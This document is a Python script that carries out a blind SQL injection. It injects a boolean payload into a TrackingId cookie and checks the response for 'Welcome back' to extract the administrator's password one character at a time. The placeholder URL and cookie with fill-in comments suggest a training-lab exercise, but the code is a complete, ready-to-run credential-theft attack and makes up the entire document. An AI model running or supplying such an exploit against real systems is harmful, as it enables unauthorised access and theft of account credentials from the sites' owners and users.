import requests
import string
import time

# Target URL
url = "http://example.new" #paste your url here

# Session cookie from the request
session_cookie = "place_holder" #put your cookie here

# Characters to try (lowercase letters, numbers, and some special chars)
chars = string.ascii_lowercase + string.digits + string.punctuation

# Function to check if the response indicates a successful guess
def check_response(response):
    return "Welcome back" in response.text

# Function to perform the blind SQL injection
def extract_password():
    password = ""
    i = 1
    
    while True:
        found = False
        
        for char in chars:
            # Construct the payload
            # This payload checks if the character at position i matches our guess
            payload = f"16nnojqCWMHT8yMM' AND SUBSTRING((SELECT password FROM users WHERE username='administrator'), {i}, 1)='{char}'--" # put your tracking cookie here
            
            # Set cookies with our payload
            cookies = {
                "TrackingId": payload,
                "session": session_cookie
            }
            
            try:
                # Send the request
                response = requests.get(url, cookies=cookies)
                
                # Check if our guess is correct
                if check_response(response):
                    password += char
                    found = True
                    print(f"Found character at position {i}: {char}")
                    print(f"Current password: {password}")
                    break
                
                # Add a small delay to avoid overloading the server
                time.sleep(0.1)
                
            except Exception as e:
                print(f"Error occurred: {e}")
                time.sleep(1)  # Longer delay if an error occurs
        
        # If no character was found, we might have reached the end of the password
        if not found:
            print(f"No character found at position {i}, password extraction complete.")
            break
            
        i += 1
    
    return password

# Run the extraction
print("Starting password extraction...")
final_password = extract_password()
print(f"Extracted password: {final_password}")